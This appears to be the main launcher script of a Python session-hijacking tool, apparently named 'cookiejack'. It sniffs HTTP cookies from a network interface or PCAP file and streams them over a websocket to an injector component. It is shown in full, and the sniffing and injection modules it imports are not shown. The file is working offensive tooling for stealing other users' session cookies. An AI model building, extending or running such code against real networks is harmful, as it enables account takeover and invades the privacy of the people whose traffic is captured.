import click
import queue
from threading import Thread
import sys
from cookiejack.pid.manager import Manager
from cookiejack.listener.queuer import Queuer as WebsocketNotifier
from cookiejack.listener.printer import Printer as PrinterNotifier
from cookiejack.server.injector_protocol import InjectorProtocol
from cookiejack.server.websocket import WebSocket
from cookiejack.sniff.cookies import Cookies as CookieSniffer
from cookiejack.validator import cookie_date

@click.command()
@click.option("--ws-port", "-wp", help="Port to bind websocket server on", default=9000, type=int)
@click.option("--ws-bind", "-wi", help="Interface to bind websocket server on", default="127.0.0.1")
@click.option("--disable-ws", "-wd", help="Disable websocket", is_flag=True)
@click.option("--sniff", "-s", help="Sniffing filter string", default="tcp port 80")
@click.option("--pcap", "-r", help="PCAP file to load", default=None)
@click.option("--interface", "-i", help="Network interface to sniff on", default=None)
@click.option("--verbose", "-v", help="Display cookie data", is_flag=True)
@click.option("--pid-log", "-l", help="File where process id will be written", default="/tmp/cookiejack.pid")
@click.option("--kill", "-k", help="Kill the application", is_flag=True)
@click.option("--cookie-expiry", "-e", help="Default cookie expiry", default=None, type=cookie_date)
def main(ws_port, ws_bind, disable_ws, sniff, pcap, interface, verbose, pid_log, kill, cookie_expiry):
    q = queue.Queue()
    listeners = [WebsocketNotifier(q)]
    pid_manager = Manager(pid_log)

    if kill:
        pid_manager.kill()
        sys.exit(0)

    pid_manager.update()

    if verbose:
        listeners.append(PrinterNotifier())

    cookie_sniffer = CookieSniffer(listeners, 
                                   filter_string=sniff, interface=interface, pcap=pcap, default_expiry=cookie_expiry)
    p = Thread(target=cookie_sniffer.sniff)
    p.start()

    if not disable_ws:
        server = WebSocket(ws_port, InjectorProtocol, bind=ws_bind)
        server.run(q)
